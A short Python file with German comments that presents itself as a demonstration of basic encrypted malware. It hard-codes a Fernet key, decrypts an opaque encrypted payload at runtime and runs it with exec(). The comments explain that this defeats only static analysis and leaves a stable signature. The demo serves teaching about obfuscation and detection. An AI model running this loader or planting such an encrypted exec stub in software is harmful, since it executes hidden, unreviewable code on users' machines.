# Einfache verschlüsselte Malware - Demonstration
# Dies ist die grundlegendste Form der Code-Verschleierung
# Der eigentliche Payload ist verschlüsselt und wird erst zur Laufzeit entschlüsselt
#
# Eigenschaften:
# - Statischer Verschlüsselungsschlüssel (fest im Code eingebettet)
# - Statischer verschlüsselter Payload (ändert sich nie)
# - Verhindert nur statische Code-Analyse
# - Signaturbasierte Erkennung ist möglich (gleicher Hash bei jeder Ausführung)

from cryptography.fernet import Fernet

# Statischer Verschlüsselungsschlüssel (base64-kodiert)
# Dieser Schlüssel wird verwendet, um den verschlüsselten Code zu entschlüsseln
# ACHTUNG: Der Schlüssel ist im Klartext sichtbar - dies ist eine Schwachstelle
key = "RcOdFc1Fesu3bF7D8jkahsw7mG2DSRPiFrbg0F4MqIo=".encode("utf-8")

# Erstelle ein Fernet-Cipher-Objekt für die symmetrische Verschlüsselung
cipher = Fernet(key)

# Entschlüssele und führe den Payload aus
# 1. cipher.decrypt() entschlüsselt den verschlüsselten String
# 2. .decode("utf-8") wandelt die Bytes in einen Python-String um
# 3. exec() führt den entschlüsselten Code aus
# WARNUNG: exec() führt beliebigen Python-Code aus!
exec(cipher.decrypt('gAAAAABpIwI3bl4OoKrXQ-UzUlxapYnRE-T1sJbVyDVNt-LKmHRplYfwUOekzSpnNkQkdkkstnQxAmzkgGycjrMn2lGTwxpK9X7j0hrWJmuYYP1wVP-NTzFxF7m7OPZK_Rw-3RRc5xwsZ6tFfLEeKYjHYtop3bfTeCPxyrD_n2MHOOUpKLwLZwNpKGHjKPB8VS4Sl8UMGcAGYwwz3XqGYzZL_nRPY9PkVhY2d71F1ac1GNWRZZ8FUIQ=').decode("utf-8"))
